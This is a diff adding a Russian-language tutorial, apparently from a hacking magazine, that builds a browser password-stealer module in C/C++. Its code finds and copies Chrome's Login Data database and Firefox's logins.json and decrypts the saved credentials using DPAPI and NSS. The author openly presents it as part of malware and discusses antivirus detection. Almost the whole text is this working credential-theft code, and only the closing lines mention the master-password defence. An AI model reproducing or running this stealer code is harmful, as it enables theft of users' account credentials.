@@ -1,0 +1,417 @@
+
+Итак, браузеры, в основе которых лежит Chrome или Firefox, хранят логины и
+пароли пользователей в зашифрованном виде в базе SQLite. Эта СУБД компактна и
+распространяется бесплатно по свободной лицензии. Так же, как и
+рассматриваемые нами браузеры: весь их код открыт и хорошо документирован,
+что, несомненно, поможет нам.
+
+В примере модуля стилинга, который я приведу в статье, будет активно
+использоваться CRT и другие сторонние библиотеки и зависимости, типа sqlite.h.
+Если тебе нужен компактный код без зависимостей, придется его немного
+переработать, избавившись от некоторых функций и настроив компилятор должным
+образом.
+
+
+Что скажет антивирус?
+
+Рекламируя свои продукты, вирусописатели часто обращают внимание потенциальных
+покупателей на то, что в данный момент их стилер не «палится» антивирусом.
+
+Тут надо понимать, что все современные и более-менее серьезные вирусы и трояны
+имеют модульную структуру, каждый модуль в которой отвечает за что-то свое:
+один модуль собирает пароли, второй препятствует отладке и эмуляции, третий
+определяет факт работы в виртуальной машине, четвертый проводит обфускацию
+вызовов WinAPI, пятый разбирается со встроенным в ОС файрволом.
+
+Так что судить о том, «палится» определенный метод антивирусом или нет, можно,
+только если речь идет о законченном «боевом» приложении, а не по отдельному
+модулю.
+
+Chrome
+
+Начнем с Chrome. Для начала давай получим файл, где хранятся учетные записи и
+пароли пользователей. В Windows он лежит по такому адресу:
+
+C:\Users\%username%\AppData\Local\Google\Chrome\UserData\Default\Login Data
+
+Чтобы совершать какие-то манипуляции с этим файлом, нужно либо убить все
+процессы браузера, что будет бросаться в глаза, либо куда-то скопировать файл
+базы и уже после этого начинать работать с ним.
+
+Давай напишем функцию, которая получает путь к базе паролей Chrome. В качестве
+аргумента ей будет передаваться массив символов с результатом ее работы (то
+есть массив будет содержать путь к файлу паролей Chrome).
+
+#define CHROME_DB_PATH  "\\Google\\Chrome\\User Data\\Default\\Login Data"
+
+bool get_browser_path(char * db_loc, int browser_family, const char * location) {
+    memset(db_loc, 0, MAX_PATH);
+    if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, db_loc))) {
+        return 0;
+    }
+
+    if (browser_family == 0) {
+        lstrcat(db_loc, TEXT(location));
+        return 1;
+    }
+}
+Вызов функции:
+
+char browser_db[MAX_PATH];
+get_browser_path(browser_db, 0, CHROME_DB_PATH);
+
+Давай вкратце поясню, что здесь происходит. Мы сразу пишем эту функцию,
+подразумевая будущее расширение. Один из ее аргументов — поле browser_family,
+оно будет сигнализировать о семействе браузеров, базу данных которых мы
+получаем (то есть браузеры на основе Chrome или Firefox).
+
+Если условие browser_family == 0 выполняется, то получаем базу паролей
+браузера на основе Chrome, если browser_family == 1 — Firefox. Идентификатор
+CHROME_DB_PATH указывает на базу паролей Chrome. Далее мы получаем путь к базе
+при помощи функции SHGetFolderPath, передавая ей в качестве аргумента CSIDL
+значение CSIDL_LOCAL_APPDATA, которое означает:
+
+#define CSIDL_LOCAL_APPDATA 0x001c // <user name>\Local Settings\Applicaiton Data (non roaming)
+
+Функция SHGetFolderPath устарела, и в Microsoft рекомендуют использовать
+вместо нее SHGetKnownFolderPath. Проблема в том, что поддержка этой функции
+начинается с Windows Vista, поэтому я применил ее более старый аналог для
+сохранения обратной совместимости. Вот ее прототип:
+
+HRESULT SHGetFolderPath(      
+    HWND hwndOwner,
+    int nFolder,
+    HANDLE hToken,
+    DWORD dwFlags,
+    LPTSTR pszPath
+);
+
+После этого функция lstrcat совмещает результат работы SHGetFolderPath с
+идентификатором CHROME_DB_PATH.
+
+База паролей получена, теперь приступаем к работе с ней. Как я уже говорил,
+это база данных SQLite, работать с ней удобно через SQLite API, которые
+подключаются с заголовочным файлом sqlite3.h. Давай скопируем файл базы
+данных, чтобы не занимать его и не мешать работе браузера.
+
+int status = CopyFile(browser_db, TEXT(".\\db_tmp"), FALSE);
+if (!status) {
+    // return 0;
+}
+
+Теперь подключаемся к базе командой sqlite3_open_v2. Ее прототип:
+
+int sqlite3_open_v2(
+    const char *filename,   /* Database filename (UTF-8) */
+    sqlite3 **ppDb,         /* OUT: SQLite db handle */
+    int flags,              /* Flags */
+    const char *zVfs        /* Name of VFS module to use */
+);
+
+Первый аргумент — наша база данных; информация о подключении возвращается во
+второй аргумент, дальше идут флаги открытия, а четвертый аргумент определяет
+интерфейс операционной системы, который должен использовать это подключение к
+базе данных, в нашем случае он не нужен. Если эта функция отработает
+корректно, возвращается значение SQLITE_OK, в противном случае возвращается
+код ошибки.
+
+sqlite3 *sql_browser_db = NULL;
+
+status = sqlite3_open_v2(TEMP_DB_PATH, 
+                &sql_browser_db, 
+                SQLITE_OPEN_READONLY, 
+                NULL);
+if(status != SQLITE_OK) {
+    sqlite3_close(sql_browser_db);
+    DeleteFile(TEXT(TEMP_DB_PATH));
+}
+
+
+
+Обрати внимание: при некорректной отработке функции нам все равно необходимо
+самостоятельно закрыть подключение к базе и удалить ее копию.
+
+Теперь начинаем непосредственно обрабатывать данные в базе. Для этого
+воспользуемся функцией sqlite3_exec().
+
+status = sqlite3_exec(sql_browser_db, 
+            "SELECT origin_url, username_value, password_value FROM logins", 
+            crack_chrome_db, 
+            sql_browser_db, 
+            &err);
+if (status != SQLITE_OK)
+    return 0;
+Эта функция имеет такой прототип:
+
+int sqlite3_exec(
+    sqlite3*,                          /* An open database */
+    const char *sql,                   /* SQL to be evaluated */
+    int (*callback)(void*,int,char**,char**),  /* Callback */
+    void *,                            /* 1st argument to callback */
+    char **errmsg                      /* Error msg written here */
+);
+
+Первый аргумент — наша база паролей, второй — это команда SQL, которая
+вытаскивает URL файла, логин, пароль и имя пользователя, третий аргумент — это
+функция обратного вызова, которая и будет расшифровывать пароли, четвертый —
+передается в нашу функцию обратного вызова, ну а пятый аргумент сообщает об
+ошибке.
+
+Давай остановимся подробнее на callback-функции, которая расшифровывает
+пароли. Она будет применяться к каждой строке из выборки нашего запроса
+SELECT. Ее прототип — int (*callback)(void*,int,char**,char**), но все
+аргументы нам не понадобятся, хотя объявлены они должны быть. Саму функцию
+назовем crack_chrome_db, начинаем писать и объявлять нужные переменные:
+
+
+
+int crack_chrome_db(void *db_in, int arg, char **arg1, char **arg2) {
+
+
+
+DATA_BLOB data_decrypt, data_encrypt;
+
+sqlite3 *in_db = (sqlite3*)db_in;
+
+BYTE *blob_data = NULL;
+
+sqlite3_blob *sql_blob = NULL;
+
+
+
+char *passwds = NULL;
+
+
+
+while (sqlite3_blob_open(in_db, "main", "logins", "password_value", count++, 0, &sql_blob) != SQLITE_OK && count <= 20 );
+
+
+В этом цикле формируем BLOB (то есть большой массив двоичных данных). Далее
+выделяем память, читаем блоб и инициализируем поля DATA_BLOB:
+
+int sz_blob;
+int result;
+
+sz_blob = sqlite3_blob_bytes(sql_blob);
+dt_blob = (BYTE *)malloc(sz_blob);
+
+if (!dt_blob) {
+    sqlite3_blob_close(sql_blob);
+    sqlite3_close(in_db);
+}
+
+data_encrypt.pbData = dt_blob;
+data_encrypt.cbData = sz_blob;
+
+А теперь приступим непосредственно к дешифровке. База данных Chrome
+зашифрована механизмом Data Protection Application Programming Interface
+(DPAPI). Суть этого механизма заключается в том, что расшифровать данные можно
+только под той учетной записью, под которой они были зашифрованы. Другими
+словами, нельзя стащить базу данных паролей, а потом расшифровать ее уже на
+своем компьютере. Для расшифровки данных нам потребуется функция
+CryptUnprotectData.
+
+DPAPI_IMP BOOL CryptUnprotectData(
+    DATA_BLOB                 *pDataIn,
+    LPWSTR                    *ppszDataDescr,
+    DATA_BLOB                 *pOptionalEntropy,
+    PVOID                     pvReserved,
+    CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
+    DWORD                     dwFlags,
+    DATA_BLOB                 *pDataOut
+);
+
+if (!CryptUnprotectData(&data_encrypt, NULL, NULL, NULL, NULL, 0, &data_decrypt)) {
+    free(dt_blob);
+    sqlite3_blob_close(sql_blob);
+    sqlite3_close(in_db);
+}
+
+После этого выделяем память и заполняем массив passwds расшифрованными
+данными.
+
+passwds = ( char *)malloc(data_decrypt.cbData + 1);
+memset(passwds, 0, data_decrypt.cbData);
+
+int xi = 0;
+while (xi < data_decrypt.cbData) {
+    passwds[xi] = (char)data_decrypt.pbData[xi];
+    ++xi;
+}
+
+Собственно, на этом все! После этого passwds будет содержать учетные записи
+пользователей и URL. А что делать с этой информацией — вывести ее на экран или
+сохранить в файл и отправить куда-то его — решать тебе.
+
+ 
+
+Firefox
+Переходим к Firefox. Это будет немного сложнее, но мы все равно справимся! 
+
+ Для начала давай получим путь до базы данных паролей. Помнишь, в нашей
+ универсальной функции get_browser_path мы передавали параметр browser_family?
+ В случае Chrome он был равен нулю, а для Firefox поставим 1.
+
+bool get_browser_path(char * db_loc, int browser_family, const char * location) {
+    ...
+    if (browser_family == 1) {
+        memset(db_loc, 0, MAX_PATH);
+        if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, db_loc))) {
+            // return 0;
+        }
+
+В случае с Firefox мы не сможем, как в Chrome, сразу указать путь до папки
+пользователя. Дело в том, что имя папки пользовательского профиля генерируется
+случайно. Но это ерундовая преграда, ведь мы знаем начало пути
+(\\Mozilla\\Firefox\\Profiles\\). Достаточно поискать в нем объект «папка» и
+проверить наличие в ней файла \\logins.json". Именно в этом файле хранятся
+интересующие нас данные логинов и паролей. Разумеется, в зашифрованном виде.
+Реализуем все это в коде.
+
+lstrcat(db_loc, TEXT(location));
+
+// Объявляем переменные
+const char * profileName = "";
+WIN32_FIND_DATA w_find_data;
+const char * db_path = db_loc;
+
+// Создаем маску для поиска функцией FindFirstFile
+lstrcat((LPSTR)db_path, TEXT("*"));
+
+// Просматриваем, нас интересует объект с атрибутом FILE_ATTRIBUTE_DIRECTORY
+HANDLE gotcha = FindFirstFile(db_path, &w_find_data);
+
+while (FindNextFile(gotcha, &w_find_data) != 0){
+    if (w_find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+        if (strlen(w_find_data.cFileName) > 2) {
+            profileName = w_find_data.cFileName;
+        }
+    }
+}
+// Убираем звездочку :)
+db_loc[strlen(db_loc) - 1] = '\0';
+
+lstrcat(db_loc, profileName); 
+
+// Наконец, получаем нужный нам путь
+lstrcat(db_loc, "\\logins.json");
+
+return 1;
+
+В самом конце переменная db_loc, которую мы передавали в качестве аргумента в
+нашу функцию, содержит полный путь до файла logins.json, а функция возвращает
+1, сигнализируя о том, что она отработала корректно.
+
+Теперь получим хендл файла паролей и выделим память под данные. Для получения
+хендла используем функцию CreateFile, как советует MSDN.
+
+DWORD read_bytes = 8192;
+DWORD lp_read_bytes;
+
+char *buffer = (char *)malloc(read_bytes);
+HANDLE db_file_login = CreateFileA(original_db_location, 
+                GENERIC_READ, 
+                FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, 
+                NULL, OPEN_ALWAYS, 
+                FILE_ATTRIBUTE_NORMAL,  
+                NULL);
+
+ReadFile(db_file_login, buffer, read_bytes, &lp_read_bytes, NULL);
+
+Все готово, но в случае с Firefox все не будет так просто, как с Chrome, — мы
+не сможем просто получить нужные данные обычным запросом SELECT, да и
+шифрование не ограничивается одной-единственной функцией WinAPI.
+
+
+ 
+
+Network Security Services (NSS)
+
+Браузер Firefox активно использует функции Network Security Services для
+реализации шифрования своей базы. Эти функции находятся в динамической
+библиотеке, которая лежит по адресу C:\Program Files\Mozilla Firefox\nss3.dll.
+
+Все интересующие нас функции нам придется получить из этой DLL. Сделать это
+можно стандартным образом, при помощи LoadLibrary\GetProcAdress. Код
+однообразный и большой, поэтому я просто приведу список функций, которые нам
+понадобятся:
+
+NSS_Init;
+PL_Base64Decode;
+PK11SDR_Decrypt;
+PK11_Authenticate;
+PK11_GetInternalKeySlot;
+PK11_FreeSlot.
+
+Это функции инициализации механизма NSS и расшифровки данных. Давай напишем
+функцию расшифровки, она небольшая. Я добавлю комментарии, чтобы все было
+понятно.
+
+char * data_uncrypt(std::string pass_str) {
+    // Объявляем переменные
+    SECItem crypt;  
+    SECItem decrypt;
+    PK11SlotInfo *slot_info;
+
+    // Выделяем память для наших данных
+    char *char_dest = (char *)malloc(8192); 
+    memset(char_dest, NULL, 8192);
+    crypt.data = (unsigned char *)malloc(8192);
+    crypt.len = 8192;
+    memset(crypt.data, NULL, 8192);
+
+    // Непосредственно расшифровка функциями NSS
+    PL_Base64Decode(pass_str.c_str(), pass_str.size(), char_dest);
+    memcpy(crypt.data, char_dest, 8192);
+    slot_info = PK11_GetInternalKeySlot();
+    PK11_Authenticate(slot_info, TRUE, NULL);
+    PK11SDR_Decrypt(&crypt, &decrypt, NULL);
+    PK11_FreeSlot(slot_info);
+
+    // Выделяем память для расшифрованных данных
+    char *value = (char *)malloc(decrypt.len);
+    value[decrypt.len] = 0;
+    memcpy(value, decrypt.data, decrypt.len);
+
+    return value;
+}
+
+Теперь осталось парсить файл logins.json и применять нашу функцию расшифровки.
+Для краткости кода я буду использовать регулярные выражения и их возможности в
+C++ 11.
+
+string decode_data = buffer;
+
+// Определяем регулярки для сайтов, логинов и паролей
+regex user("\"encryptedUsername\":\"([^\"]+)\"");
+regex passw("\"encryptedPassword\":\"([^\"]+)\"");
+regex host("\"hostname\":\"([^\"]+)\"");
+
+// Объявим переменную и итератор
+smatch smch;
+string::const_iterator pars(decode_data.cbegin());
+
+// Парсинг при помощи regex_search, расшифровка данных нашей
+// функцией data_uncrypt и вывод на экран расшифрованных данных
+do {
+    printf("Site\t: %s", smch.str(1).c_str());
+    regex_search(pars, decode_data.cend(), smch, user);
+    printf("Login: %s", data_uncrypt(smch.str(1)));
+
+    regex_search(pars, decode_data.cend(), smch, passw);
+    printf("Pass: %s",data_uncrypt( smch.str(1)));
+
+    pars += smch.position() + smch.length();
+
+} while (regex_search(pars, decode_data.cend(), smch, host));
+ 
+
+Заключение
+
+Мы разобрались, как хранятся пароли в разных браузерах, и узнали, что нужно
+делать, чтобы их извлечь. Можно ли защититься от подобных методов
+восстановления сохраненных паролей? Да, конечно. Если установить в браузере
+мастер-пароль, то он выступит в качестве криптографической соли для
+расшифровки базы данных паролей. Без ее знания восстановить данные будет
+невозможно.
+
